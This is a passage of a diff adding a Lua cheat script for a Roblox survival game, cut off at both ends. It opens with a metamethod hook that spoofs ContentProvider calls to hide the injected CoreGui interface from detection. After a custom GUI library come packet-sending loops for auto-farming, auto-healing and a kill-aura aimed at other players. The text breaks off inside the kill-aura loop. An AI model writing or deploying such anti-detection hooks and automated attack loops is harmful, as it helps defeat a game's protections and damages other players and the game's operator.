+	local NamecallMethod = getnamecallmethod()
+	if not checkcaller() and type(Args[1]) == "table" and table.find(Args[1], CoreGui) and Self == game.GetService(game, "ContentProvider") and football(NamecallMethod) then
+		Args[1] = tbl
+		return __namecall(Self, unpack(Args))
+	end
+	return __namecall(Self, ...)
+end)
+
+
+local utility = {}
+local UIS = game:GetService("UserInputService");
+local RS = game:GetService("RunService");
+local TS = game:GetService("TweenService");
+local mouse = game:GetService('Players').LocalPlayer:GetMouse()
+
+local Library = {}
+local mainKeybind = "LeftControl"
+local canDrag = true
+
+function utility:ToRGB(color)  
+	return color.R*255,color.G*255,color.B*255
+end
+
+local function CreateDrag(gui)
+	local dragging
+	local dragInput
+	local dragStart
+	local startPos
+
+	local function update(input)
+		local delta = input.Position - dragStart
+		TS:Create(gui, TweenInfo.new(0.16, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)}):Play();
+	end
+
+	local lastEnd = 0
+	local lastMoved = 0
+	local con
+	gui.InputBegan:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+			if not canDrag then return end
+			dragging = true
+			dragStart = input.Position
+			startPos = gui.Position
+
+		end
+	end)
+
+	UIS.InputEnded:Connect(function(input)
+
+		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+			dragging = false
+		end
+	end)
+
+
+	gui.InputChanged:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+			dragInput = input
+			lastMoved = os.clock()
+		end
+	end)
+
+	UIS.InputChanged:Connect(function(input)
+		if input == dragInput and dragging then
+			update(input)
+		end
+	end)
+end
+
+local tweenInfo = TweenInfo.new(.2, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut)
+local tweenInfo2 = TweenInfo.new(.5, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut)
+function Library:tween(object, goal, callback)
+	local tween = TS:Create(object, tweenInfo, goal)
+	tween.Completed:Connect(callback or function() end)
+	tween:Play()
+end
+
+function Library:tween2(object, goal, callback)
+	local tween = TS:Create(object, tweenInfo2, goal)
+	tween.Completed:Connect(callback or function() end)
+	tween:Play()
+end
+
+local ScreenGui = Instance.new('ScreenGui', gethui())
+
+function Library:CreateWindow(options)
+	local GUI = {
+		CurrentTab = nil
+	}
+	
+
+	local Main = Instance.new('Frame', ScreenGui)
+	local Title = Instance.new('TextLabel', Main)
+	local Divider = Instance.new('Frame', Main)
+	local TabBar = Instance.new('ScrollingFrame', Main)
+	local TabLayout = Instance.new('UIListLayout', TabBar)
+	local TabBarPad = Instance.new('UIPadding', TabBar)
+	local MainCorner = Instance.new('UICorner', Main)
+	local MainGradient = Instance.new('UIGradient', Main)
+	local Divider2 = Instance.new('Frame', Main)
+	
+	ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+	Main.Name = "Main"
+	Main.Position = UDim2.new(0.271,0,0.2845,0)
+	Main.Size = UDim2.new(0,710,0,405)
+	Main.BackgroundColor3 = Color3.new(1,1,1)
+	Main.BorderSizePixel = 0
+	Main.BorderColor3 = Color3.new(0,0,0)
+	Main.ZIndex = 100
+	Title.Name = "Title"
+	Title.Position = UDim2.new(0.0254,0,0,0)
+	Title.Size = UDim2.new(0,143,0,50)
+	Title.BackgroundColor3 = Color3.new(1,1,1)
+	Title.BackgroundTransparency = 1
+	Title.BorderSizePixel = 0
+	Title.BorderColor3 = Color3.new(0,0,0)
+	Title.Text = options.Title
+	Title.TextColor3 = Color3.new(0.7843,0.7843,0.7843)
+	Title.Font = Enum.Font.Gotham
+	Title.TextSize = 23
+	Title.ZIndex = 101
+	Title.TextXAlignment = Enum.TextXAlignment.Left
+	Divider.Name = "Divider"
+	Divider.Position = UDim2.new(0,0,0.121,0)
+	Divider.Size = UDim2.new(0,710,0,1)
+	Divider.BackgroundColor3 = Color3.new(0.7843,0.7843,0.7843)
+	Divider.BorderSizePixel = 0
+	Divider.BorderColor3 = Color3.new(0,0,0)
+	Divider.ZIndex = 102
+	TabBar.Name = "TabBar"
+	TabBar.Position = UDim2.new(0,0,0.1235,0)
+	TabBar.Size = UDim2.new(0,161,0,355)
+	TabBar.BackgroundColor3 = Color3.new(1,1,1)
+	TabBar.BackgroundTransparency = 1
+	TabBar.BorderSizePixel = 0
+	TabBar.BorderColor3 = Color3.new(0,0,0)
+	TabBar.ZIndex = 103
+	TabBar.ScrollingEnabled = false
+	TabBar.ScrollBarThickness = 0
+	TabBar.ScrollBarImageColor3 = Color3.new(0,0,0)
+	TabLayout.Name = "TabLayout"
+	TabLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+	TabLayout.SortOrder = Enum.SortOrder.LayoutOrder
+	TabBarPad.Name = "TabBarPad"
+	TabBarPad.PaddingTop = UDim.new(0,5)
+	Divider2.Name = "Divider2"
+	Divider2.Position = UDim2.new(0.2246,0,0.121,0)
+	Divider2.Size = UDim2.new(0,1,0,356)
+	Divider2.BackgroundColor3 = Color3.new(0.6392,0.6392,0.6392)
+	Divider2.BackgroundTransparency = 0.5
+	Divider2.BorderSizePixel = 0
+	Divider2.BorderColor3 = Color3.new(0,0,0)
+	Divider2.ZIndex = 102
+	MainCorner.CornerRadius = UDim.new(0,20)
+	MainGradient.Name = "MainGradient"
+	MainGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.04313725605607033, 0.019607843831181526, 0.15294118225574493)), ColorSequenceKeypoint.new(1.00,Color3.new(0.5098039507865906, 0.1882352977991104, 0.1568627506494522))}
+
+	local MC = Instance.new('ScreenGui', gethui())
+	local MobileCard = Instance.new('ImageButton', MC)
+	local CardGradient = Instance.new('UIGradient', MobileCard)
+	local CardText = Instance.new('TextLabel', MobileCard)
+	local CardCorner = Instance.new('UICorner', MobileCard)
+
+	MC.Name = "MC"
+	MC.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+	MobileCard.Name = "MobileCard"
+	MobileCard.Position = UDim2.new(0.5, -20, 0, 10);
+	MobileCard.Size = UDim2.new(0,40,0,40)
+	MobileCard.BackgroundColor3 = Color3.new(1,1,1)
+	MobileCard.BorderSizePixel = 0
+	MobileCard.BorderColor3 = Color3.new(0,0,0)
+	MobileCard.AutoButtonColor = false
+	CardGradient.Name = "CardGradient"
+	CardGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.04313725605607033, 0.019607843831181526, 0.15294118225574493)), ColorSequenceKeypoint.new(1.00,Color3.new(0.5098039507865906, 0.1882352977991104, 0.1568627506494522))}
+	CardGradient.Rotation = -84
+	CardText.Name = "CardText"
+	CardText.Size = UDim2.new(0,40,0,40)
+	CardText.BackgroundColor3 = Color3.new(1,1,1)
+	CardText.BackgroundTransparency = 1
+	CardText.BorderSizePixel = 0
+	CardText.BorderColor3 = Color3.new(0,0,0)
+	CardText.Text = "S"
+	CardText.TextColor3 = Color3.new(0.7843,0.7843,0.7843)
+	CardText.Font = Enum.Font.Gotham
+	CardText.TextSize = 23
+	CardText.ZIndex = 101
+
+	MobileCard.MouseButton1Click:Connect(function()
+		ScreenGui.Enabled = not ScreenGui.Enabled
+	end)
+	
+	CreateDrag(MobileCard)
+	CreateDrag(Main)
+
+	function Library:Toggle()
+		ScreenGui.Enabled = not ScreenGui.Enabled
+	end
+
+	UIS.InputBegan:Connect(function(key, gp)
+		if gp then return end;
+
+		if key.KeyCode == Enum.KeyCode[mainKeybind] then
+			Library:Toggle()
+		end
+	end)
+
+	function GUI:NewTab(options)
+		
+		local tab = {
+			Active = false
+		}
+		
+		local Canvas = Instance.new('ScrollingFrame', Main)
+		local UIListLayout = Instance.new('UIListLayout', Canvas)
+		local UIPadding = Instance.new('UIPadding', Canvas)
+		local SelectedTab = Instance.new('Frame', TabBar)
+		local Highlight = Instance.new('Frame', SelectedTab)
+		local STCorner = Instance.new('UICorner', SelectedTab)
+		local Tab = Instance.new('TextButton', SelectedTab)
+		
+		SelectedTab.Name = "SelectedTab"
+		SelectedTab.Position = UDim2.new(88.03,0,0.6006,0)
+		SelectedTab.Size = UDim2.new(0,118,0,34)
+		SelectedTab.BackgroundColor3 = Color3.new(0,0,0)
+		SelectedTab.BackgroundTransparency = 1
+		SelectedTab.BorderSizePixel = 0
+		SelectedTab.BorderColor3 = Color3.new(0,0,0)
+		SelectedTab.ZIndex = 100
+		Highlight.Name = "Highlight"
+		Highlight.Position = UDim2.new(0.0508,0,0.2353,0)
+		Highlight.Size = UDim2.new(0,2,0,18)
+		Highlight.BackgroundColor3 = Color3.new(0.8353,0.8353,0.8353)
+		Highlight.BorderSizePixel = 0
+		Highlight.Transparency = 1
+		Highlight.BorderColor3 = Color3.new(0,0,0)
+		Highlight.ZIndex = 101
+		STCorner.CornerRadius = UDim.new(0,6)
+		Tab.Name = "Tab"
+		Tab.Position = UDim2.new(0.0678,0,0,0)
+		Tab.Size = UDim2.new(0,109,0,34)
+		Tab.BackgroundColor3 = Color3.new(1,1,1)
+		Tab.BackgroundTransparency = 1
+		Tab.BorderSizePixel = 0
+		Tab.BorderColor3 = Color3.new(0,0,0)
+		Tab.Text = options.Name
+		Tab.TextColor3 = Color3.new(0.5529,0.5529,0.5529)
+		Tab.Font = Enum.Font.Gotham
+		Tab.TextSize = 14
+		Tab.ZIndex = 105
+		Tab.AutoButtonColor = false		
+		Canvas.Name = "Canvas"
+		Canvas.Position = UDim2.new(0.2268,0,0.1235,0)
+		Canvas.Size = UDim2.new(0,549,0,355)
+		Canvas.BackgroundColor3 = Color3.new(1,1,1)
+		Canvas.BackgroundTransparency = 1
+		Canvas.BorderSizePixel = 0
+		Canvas.BorderColor3 = Color3.new(0,0,0)
+		Canvas.ZIndex = 107
+		Canvas.Visible = false
+		Canvas.AutomaticCanvasSize = Enum.AutomaticSize.Y;
+		Canvas.ScrollBarThickness = 0
+		Canvas.ScrollBarImageColor3 = Color3.new(0,0,0)
+		UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+		UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
+		UIListLayout.Padding = UDim.new(0,5)
+		UIPadding.PaddingTop = UDim.new(0,10)
+		
+		function tab:Activate()
+			if not tab.Active then
+				if GUI.CurrentTab ~= nil then
+					GUI.CurrentTab:Deactivate()
+				end
+				tab.Active = true
+				Library:tween(Tab, {TextColor3 = Color3.new(1,1,1)})
+				Library:tween(SelectedTab, {BackgroundTransparency = 0.5})
+				Library:tween(Highlight, {BackgroundTransparency = 0})
+				Canvas.Visible = true
+				GUI.CurrentTab = tab
+			end
+		end
+
+		function tab:Deactivate()
+			if tab.Active then
+				tab.Active = false
+				Library:tween(Tab, {TextColor3 =Color3.new(0.5529,0.5529,0.5529)})
+				Library:tween(SelectedTab, {BackgroundTransparency = 1})
+				Library:tween(Highlight, {BackgroundTransparency = 1})
+				Canvas.Visible = false
+			end
+		end
+
+		Tab.MouseButton1Click:Connect(function()
+			tab:Activate()
+		end)
+
+		if GUI.CurrentTab == nil then
+			tab.Activate()	
+		end
+		
+		
+		function tab:NewToggle(options)
+			
+			local toggle = {
+				State = false
+			}
+			
+			local Toggle = Instance.new('ImageButton', Canvas)
+			local ToggleTitle = Instance.new('TextLabel', Toggle)
+			local CheckBox = Instance.new('Frame', Toggle)
+			local CheckBoxCorner = Instance.new('UICorner', CheckBox)
+			local CheckMark = Instance.new('ImageButton', CheckBox)
+			local ToggleCorner = Instance.new('UICorner', Toggle)
+			
+
+
+			Toggle.Name = "Toggle"
+			Toggle.Position = UDim2.new(0.2606,0,0.5185,0)
+			Toggle.Size = UDim2.new(0,499,0,34)
+			Toggle.BackgroundColor3 = Color3.new(0,0,0)
+			Toggle.BackgroundTransparency = 0.5
+			Toggle.BorderSizePixel = 0
+			Toggle.BorderColor3 = Color3.new(0,0,0)
+			Toggle.ZIndex = 108
+			Toggle.AutoButtonColor = false		
+			ToggleTitle.Name = "ToggleTitle"
+			ToggleTitle.Position = UDim2.new(0.0321,0,0,0)
+			ToggleTitle.Size = UDim2.new(0,363,0,34)
+			ToggleTitle.BackgroundColor3 = Color3.new(1,1,1)
+			ToggleTitle.BackgroundTransparency = 1
+			ToggleTitle.BorderSizePixel = 0
+			ToggleTitle.BorderColor3 = Color3.new(0,0,0)
+			ToggleTitle.Text = options.Name
+			ToggleTitle.TextColor3 = Color3.new(0.851,0.851,0.851)
+			ToggleTitle.Font = Enum.Font.Gotham
+			ToggleTitle.TextSize = 14
+			ToggleTitle.ZIndex = 109
+			ToggleTitle.TextXAlignment = Enum.TextXAlignment.Left
+			CheckBox.Name = "CheckBox"
+			CheckBox.Position = UDim2.new(0.9359,0,0.1471,0)
+			CheckBox.Size = UDim2.new(0,24,0,24)
+			CheckBox.BackgroundColor3 = Color3.new(0.0706,0.0706,0.0706)
+			CheckBox.BorderSizePixel = 0
+			CheckBox.BorderColor3 = Color3.new(0,0,0)
+			CheckBox.ZIndex = 107
+			CheckBoxCorner.CornerRadius = UDim.new(0,5)
+			CheckMark.Name = "CheckMark"
+			CheckMark.Position = UDim2.new(0.0464,0,0.0417,0)
+			CheckMark.Size = UDim2.new(0,22,0,22)
+			CheckMark.BackgroundColor3 = Color3.new(0,0,0)
+			CheckMark.BackgroundTransparency = 1
+			CheckMark.BorderSizePixel = 0
+			CheckMark.BorderColor3 = Color3.new(0,0,0)
+			CheckMark.Image = "rbxassetid://6031094667"
+			CheckMark.Visible = true
+			CheckMark.AutoButtonColor = false
+			CheckMark.ZIndex = 107
+			ToggleCorner.CornerRadius = UDim.new(0,6)
+			
+			toggle.State = options.default
+
+			options.callback(toggle.State)
+
+			if toggle.State then
+				Library:tween(CheckMark, {ImageTransparency = 0})
+			else
+				Library:tween(CheckMark, {ImageTransparency = 1})
+			end
+
+			function toggle:Toggle(boolean)
+				if boolean == nil then
+					toggle.State = not toggle.State
+				else
+					toggle.State = boolean
+				end
+
+				if toggle.State then
+					print("a")
+					Library:tween(CheckMark, {ImageTransparency = 0})
+				else
+					Library:tween(CheckMark, {ImageTransparency = 1})
+				end
+
+				options.callback(toggle.State)
+			end
+
+			Toggle.MouseButton1Down:Connect(function()
+				toggle:Toggle()
+			end)
+			
+			return toggle
+		end
+		
+		function tab:NewSlider(options)
+			local slider = {
+				hover = false,
+				MouseDown = false,
+				connections = {}
+			}
+			
+			local Slider = Instance.new('ImageButton', Canvas)
+			local SliderTitle = Instance.new('TextLabel', Slider)
+			local SliderBack = Instance.new('Frame', Slider)
+			local SliderBackCorner = Instance.new('UICorner', SliderBack)
+			local SliderMain = Instance.new('Frame', SliderBack)
+			local SliderMainCorner = Instance.new('UICorner', SliderMain)
+			local SliderCorner = Instance.new('UICorner', Slider)
+			local SliderAmt = Instance.new('TextBox', Slider)
+			
+
+			Slider.Name = "Slider"
+			Slider.Position = UDim2.new(0.2606,0,0.5185,0)
+			Slider.Size = UDim2.new(0,499,0,34)
+			Slider.BackgroundColor3 = Color3.new(0,0,0)
+			Slider.BackgroundTransparency = 0.5
+			Slider.BorderSizePixel = 0
+			Slider.BorderColor3 = Color3.new(0,0,0)
+			Slider.ZIndex = 108
+			Slider.AutoButtonColor = false
+			SliderTitle.Name = "SliderTitle"
+			SliderTitle.Position = UDim2.new(0.0321,0,0,0)
+			SliderTitle.Size = UDim2.new(0,211,0,34)
+			SliderTitle.BackgroundColor3 = Color3.new(1,1,1)
+			SliderTitle.BackgroundTransparency = 1
+			SliderTitle.BorderSizePixel = 0
+			SliderTitle.BorderColor3 = Color3.new(0,0,0)
+			SliderTitle.Text = options.Name
+			SliderTitle.TextColor3 = Color3.new(0.851,0.851,0.851)
+			SliderTitle.Font = Enum.Font.Gotham
+			SliderTitle.TextSize = 14
+			SliderTitle.ZIndex = 109
+			SliderTitle.TextXAlignment = Enum.TextXAlignment.Left
+			SliderBack.Name = "SliderBack"
+			SliderBack.Position = UDim2.new(0.5251,0,0.4118,0)
+			SliderBack.Size = UDim2.new(0,229,0,6)
+			SliderBack.BackgroundColor3 = Color3.new(0.0706,0.0706,0.0706)
+			SliderBack.BorderSizePixel = 0
+			SliderBack.BorderColor3 = Color3.new(0,0,0)
+			SliderBack.ZIndex = 109
+			SliderBackCorner.CornerRadius = UDim.new(0,5)
+			SliderMain.Name = "SliderMain"
+			SliderMain.Position = UDim2.new(-0,0,0,0)
+			SliderMain.Size = UDim2.new(0,118,0,6)
+			SliderMain.BackgroundColor3 = Color3.new(1,1,1)
+			SliderMain.BorderSizePixel = 0
+			SliderMain.BorderColor3 = Color3.new(0,0,0)
+			SliderMain.ZIndex = 109
+			SliderMainCorner.CornerRadius = UDim.new(0,5)
+			SliderCorner.CornerRadius = UDim.new(0,6)
+			SliderAmt.Name = "SliderAmt"
+			SliderAmt.Position = UDim2.new(0.4569,0,0,0)
+			SliderAmt.Size = UDim2.new(0,34,0,34)
+			SliderAmt.BackgroundColor3 = Color3.new(1,1,1)
+			SliderAmt.BackgroundTransparency = 1
+			SliderAmt.BorderSizePixel = 0
+			SliderAmt.BorderColor3 = Color3.new(0,0,0)
+			SliderAmt.Text = "33"
+			SliderAmt.TextColor3 = Color3.new(0.851,0.851,0.851)
+			SliderAmt.Font = Enum.Font.Gotham
+			SliderAmt.TextSize = 11
+			SliderAmt.ZIndex = 109
+			
+
+			function slider:SetValue(v)
+				if v == nil then
+					local percentage = math.clamp((mouse.X - SliderBack.AbsolutePosition.X) / (SliderBack.AbsoluteSize.X), 0, 1)
+					local value = ((options.max - options.min) * percentage) + options.min
+					if value % 1 == 0 then
+						SliderAmt.Text = string.format("%.0f", value)
+					else
+						SliderAmt.Text = string.format("%.2f", value)
+					end
+					SliderMain.Size = UDim2.fromScale(percentage, 1)
+				else
+					if v % 1 == 0 then
+						SliderAmt.Text = string.format("%.0f", v)
+					else
+						SliderAmt.Text = tostring(v)
+					end
+					SliderMain.Size = UDim2.fromScale(((v - options.min) / (options.max - options.min)), 1)
+				end
+				options.callback(slider:GetValue())
+			end
+
+
+			function slider:GetValue()
+				return tonumber(SliderAmt.Text)
+			end
+
+			slider:SetValue(options.default)
+
+			SliderAmt.FocusLost:Connect(function()
+				local toNum
+				pcall(function()
+					toNum = tonumber(SliderAmt.Text)
+				end)
+				if toNum then
+					toNum = math.clamp(toNum, options.min, options.max)
+					slider:SetValue(toNum)
+				else
+					SliderAmt.Text = "only number :<"
+				end
+			end)
+
+			local Connection;
+			table.insert(slider.connections, UIS.InputEnded:Connect(function(input)
+				if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+					pcall(function()
+						Connection:Disconnect();
+						Connection = nil;
+					end)
+				end
+			end))
+
+			--LPH_NO_VIRTUALIZE(function()
+			table.insert(slider.connections, Slider.MouseButton1Down:Connect(function()
+				if(Connection) then
+					Connection:Disconnect();
+				end;
+
+				Connection = RS.Heartbeat:Connect(function()
+					--options.callback()
+
+						slider:SetValue()
+
+				end)
+			end))
+			--end)()
+
+			return slider
+		end
+		
+		function tab:NewDropDown(options)
+			local dropdown = {}
+			
+			local Dropdown = Instance.new('Frame', Canvas)
+			local DropdownTitle = Instance.new('TextLabel', Dropdown)
+			local DropdownSelected = Instance.new('Frame', Dropdown)
+			local SelectedOptionCorner = Instance.new('UICorner', DropdownSelected)
+			local SelectedText = Instance.new('TextButton', DropdownSelected)
+			local DropdownCorner = Instance.new('UICorner', Dropdown)
+			
+			Dropdown.Name = "Dropdown"
+			Dropdown.Position = UDim2.new(0.2606,0,0.5185,0)
+			Dropdown.Size = UDim2.new(0,499,0,34)
+			Dropdown.BackgroundColor3 = Color3.new(0,0,0)
+			Dropdown.BackgroundTransparency = 0.5
+			Dropdown.BorderSizePixel = 0
+			Dropdown.BorderColor3 = Color3.new(0,0,0)
+			Dropdown.ZIndex = 108
+			DropdownTitle.Name = "DropdownTitle"
+			DropdownTitle.Position = UDim2.new(0.0321,0,0,0)
+			DropdownTitle.Size = UDim2.new(0,312,0,34)
+			DropdownTitle.BackgroundColor3 = Color3.new(1,1,1)
+			DropdownTitle.BackgroundTransparency = 1
+			DropdownTitle.BorderSizePixel = 0
+			DropdownTitle.BorderColor3 = Color3.new(0,0,0)
+			DropdownTitle.Text = options.Name
+			DropdownTitle.TextColor3 = Color3.new(0.851,0.851,0.851)
+			DropdownTitle.Font = Enum.Font.Gotham
+			DropdownTitle.TextSize = 14
+			DropdownTitle.ZIndex = 109
+			DropdownTitle.TextXAlignment = Enum.TextXAlignment.Left
+			DropdownSelected.Name = "DropdownSelected"
+			DropdownSelected.Position = UDim2.new(0.6794,0,0.1471,0)
+			DropdownSelected.Size = UDim2.new(0,152,0,24)
+			DropdownSelected.BackgroundColor3 = Color3.new(0.0706,0.0706,0.0706)
+			DropdownSelected.BorderSizePixel = 0
+			DropdownSelected.BorderColor3 = Color3.new(0,0,0)
+			DropdownSelected.ZIndex = 109
+			SelectedOptionCorner.CornerRadius = UDim.new(0,5)
+			SelectedText.Name = "SelectedText"
+			SelectedText.Position = UDim2.new(0.0321,0,0,0)
+			SelectedText.Size = UDim2.new(0,147,0,24)
+			SelectedText.BackgroundColor3 = Color3.new(1,1,1)
+			SelectedText.BackgroundTransparency = 1
+			SelectedText.BorderSizePixel = 0
+			SelectedText.BorderColor3 = Color3.new(0,0,0)
+			SelectedText.AutoButtonColor = false
+			SelectedText.Text = options.default
+			SelectedText.TextColor3 = Color3.new(0.851,0.851,0.851)
+			SelectedText.Font = Enum.Font.Gotham
+			SelectedText.TextSize = 13
+			SelectedText.ZIndex = 109
+			DropdownCorner.CornerRadius = UDim.new(0,6)
+			
+
+			local DropDownOptions = Instance.new('Frame', Main)
+			local Frame = Instance.new('Frame', DropDownOptions)
+			local UIListLayout = Instance.new('UIListLayout', Frame)
+
+			--Properties
+
+			DropDownOptions.Name = "DropDownOptions"
+			DropDownOptions.Position = UDim2.new(1.0211,0,0.1358,0)
+			DropDownOptions.Size = UDim2.new(0,100,0,49)
+			DropDownOptions.BackgroundColor3 = Color3.new(0,0,0)
+			DropDownOptions.BackgroundTransparency = 0.25
+			DropDownOptions.BorderSizePixel = 0
+			DropDownOptions.BorderColor3 = Color3.new(0,0,0)
+			DropDownOptions.Visible = false
+			DropDownOptions.AutomaticSize = Enum.AutomaticSize.XY
+			DropDownOptions.ZIndex = 110
+			Frame.Size = UDim2.new(0,100,0,49)
+			Frame.BackgroundColor3 = Color3.new(1,1,1)
+			Frame.BackgroundTransparency = 1
+			Frame.BorderSizePixel = 0
+			Frame.BorderColor3 = Color3.new(0,0,0)
+			Frame.AutomaticSize = Enum.AutomaticSize.XY
+			Frame.ZIndex = 110
+			UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+			UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
+			
+			for i, v in pairs(options.options) do
+				local Option = Instance.new('TextButton', Frame)
+				local Highlight = Instance.new('Frame', Option)
+				Option.Name = "Option"
+				Option.Position = UDim2.new(0.02,0,0,0)
+				Option.Size = UDim2.new(0,98,0,27)
+				Option.BackgroundColor3 = Color3.new(1,1,1)
+				Option.BackgroundTransparency = 1
+				Option.BorderSizePixel = 0
+				Option.Text = v
+				Option.BorderColor3 = Color3.new(0,0,0)
+				Option.TextColor3 = Color3.new(0.8627,0.8627,0.8627)
+				Option.Font = Enum.Font.SourceSans
+				Option.TextSize = 14
+				Option.ZIndex = 111
+				Highlight.Name = "Highlight"
+				Highlight.Position = UDim2.new(-0.0306,0,0,0)
+				Highlight.Size = UDim2.new(0,2,0,27)
+				Highlight.BackgroundColor3 = Color3.new(1,1,1)
+				Highlight.BorderSizePixel = 0
+				Highlight.BorderColor3 = Color3.new(0,0,0)
+				Highlight.AutomaticSize = Enum.AutomaticSize.Y
+				Highlight.ZIndex = 111
+				
+				Option.MouseButton1Down:Connect(function()
+					SelectedText.Text = v
+					DropDownOptions.Visible = false
+					options.callback(v)
+				end)
+			end
+			
+			SelectedText.MouseButton1Down:Connect(function()
+				DropDownOptions.Visible = not DropDownOptions.Visible
+			end)
+			
+			options.callback(options.default)
+			
+			return dropdown
+		end
+		
+		function tab:NewButton(options)
+			local button = {}
+			
+			local Button = Instance.new('Frame', Canvas)
+			local ButtonTitle = Instance.new('TextButton', Button)
+			local ButtonCorner = Instance.new('UICorner', Button)
+
+			--Properties
+
+			Button.Name = "Button"
+			Button.Position = UDim2.new(0.3338,0,0.6099,0)
+			Button.Size = UDim2.new(0,499,0,34)
+			Button.BackgroundColor3 = Color3.new(0,0,0)
+			Button.BackgroundTransparency = 0.5
+			Button.BorderSizePixel = 0
+			Button.BorderColor3 = Color3.new(0,0,0)
+			Button.ZIndex = 108
+			ButtonTitle.Name = "ButtonTitle"
+			ButtonTitle.Size = UDim2.new(0,498,0,34)
+			ButtonTitle.BackgroundColor3 = Color3.new(1,1,1)
+			ButtonTitle.AutoButtonColor = false
+			ButtonTitle.BackgroundTransparency = 1
+			ButtonTitle.BorderSizePixel = 0
+			ButtonTitle.BorderColor3 = Color3.new(0,0,0)
+			ButtonTitle.Text = options.Name
+			ButtonTitle.TextColor3 = Color3.new(0.851,0.851,0.851)
+			ButtonTitle.Font = Enum.Font.Gotham
+			ButtonTitle.TextSize = 14
+			ButtonTitle.ZIndex = 109
+			ButtonCorner.CornerRadius = UDim.new(0,6)
+			
+			ButtonTitle.MouseButton1Down:Connect(function()
+				Library:tween(Button, {BackgroundColor3 = Color3.new(0.756863, 0.756863, 0.756863)})
+			end)
+			
+			ButtonTitle.MouseButton1Up:Connect(function()
+				Library:tween(Button, {BackgroundColor3 = Color3.fromRGB(0, 0, 0)})
+			end)
+			
+			ButtonTitle.MouseButton1Click:Connect(function()
+				options.callback()
+			end)
+			
+			return button
+		end
+		
+		return tab
+	end
+	
+	return GUI
+end
+
+local players = game:GetService("Players")
+local replicated_storage = game:GetService("ReplicatedStorage")
+local item_data = require(replicated_storage.Modules.ItemData)
+local item_ids = require(replicated_storage.Modules.ItemIDS)
+
+local local_player = players.LocalPlayer
+
+local packets = require(replicated_storage.Modules.Packets)
+local gu = require(replicated_storage.Modules.GameUtil)
+
+local win = Library:CreateWindow({
+    Title = "auto farm HIT THE S TOP MIDDLE SCREEN"
+})
+local local_player = players.LocalPlayer
+local farming_tab = win:NewTab({Name = "farming"})
+
+--autohit
+
+
+
+local antiAfkEnabled = false
+
+
+
+local autoheal = false
+local autoplant = false
+local autoharvest = false
+local ka = false
+
+local health_threshold = 100
+local health_fruit = "Bloodfruit"
+local health_cps = 22
+
+local plant_range = 25
+local harvest_range = 45
+local plant_fruit = "Bloodfruit"
+
+function get_index(name)
+    for index, data in next, gu.GetData().inventory do
+        if data.name == name then
+            return index
+        end
+    end
+end
+
+function calc_fruit_for_health(health)
+    local data = item_data[health_fruit]
+
+    if data and data.nourishment and data.nourishment.health then
+        local hp = data.nourishment.health
+
+        local times = 0
+        local health_healed = 0
+
+        while health_healed < health and task.wait() do
+            times += 1
+            health_healed += hp
+        end
+
+        return times
+    end
+
+    return 0
+end
+
+function check_for_bush(model)
+    return string.find(string.lower(model.Name), "bush") ~= nil or string.find(string.lower(model.Name), "tree") ~= nil or string.find(string.lower(model.Name), "patch") ~= nil or string.find(string.lower(model.Name), "crop") ~= nil
+end
+--autocraft
+function check_box(model)
+    return model:FindFirstChild("Seed") ~= nil
+end
+
+function get_nearest_bush()
+    local parts = workspace:GetPartBoundsInRadius(local_player.Character:GetPivot().Position, harvest_range)
+
+    local closest_bush = nil
+    local closest = math.huge
+
+    for _, part in next, parts do
+        local is_bush = check_for_bush(part.Parent)
+
+        if is_bush then
+            local bush = part.Parent
+
+            local dist = (bush:GetPivot().Position - local_player.Character:GetPivot().Position).Magnitude
+
+            if closest_bush ~= bush and dist < closest then
+                closest_bush = bush
+                closest = dist
+            end
+        end
+    end
+
+    return closest_bush
+end
+
+function get_nearest_empty_plantbox()
+    local parts = workspace:GetPartBoundsInRadius(local_player.Character:GetPivot().Position, plant_range)
+
+    local plant_box = nil
+    local closest = math.huge
+
+    for _, part in next, parts do
+        if part.Parent.Name ~= "Plant Box" then continue end
+        local has_plant = check_box(part.Parent)
+
+        if not has_plant then
+            local box = part.Parent
+
+            local dist = (box:GetPivot().Position - local_player.Character:GetPivot().Position).Magnitude
+
+            if dist < closest then
+                plant_box = box
+                closest = dist
+            end
+        end
+    end
+
+    return plant_box
+end
+
+--anti afk
+-- loops (doing 3 loops cuz delays should be different)
+
+-- autoplant loop
+
+task.spawn(function()
+    while task.wait(0.05) do
+        if autoplant then
+            local box = get_nearest_empty_plantbox()
+
+            if box then
+                packets.InteractStructure.send({["structure"] = box, ["itemID"] = item_ids[plant_fruit]})
+            end
+        end
+    end
+end)
+
+-- buffer
+
+task.spawn(function()
+    while task.wait(.05) do
+        if autoharvest then
+            local bush = get_nearest_bush()
+
+            if bush then
+                packets.Pickup.send(bush)
+            end
+        end
+    end
+end)
+
+-- autoheal loop
+
+local last_eat = tick()
+
+task.spawn(function()
+    while task.wait() do
+        if tick() - last_eat > 1/health_cps then
+            last_eat = tick()
+            if autoheal then
+
+                if local_player.Character:FindFirstChildOfClass("Humanoid").Health < health_threshold then
+                    local ind = get_index(health_fruit)
+                
+                    if ind then
+                        packets.UseBagItem.send(ind)
+                    end
+                end
+
+            end
+        end
+    end
+end)
+
+-- killaura loop
+
+local last_attack = tick()
+
+task.spawn(function()
+	while task.wait(.05) do
+		if ka then
+			for _, player in next, players:GetPlayers() do
+				if player ~= local_player and player.Character and player.Character.PrimaryPart then
+					local dist = (player.Character:GetPivot().Position - local_player.Character:GetPivot().Position).Magnitude
+
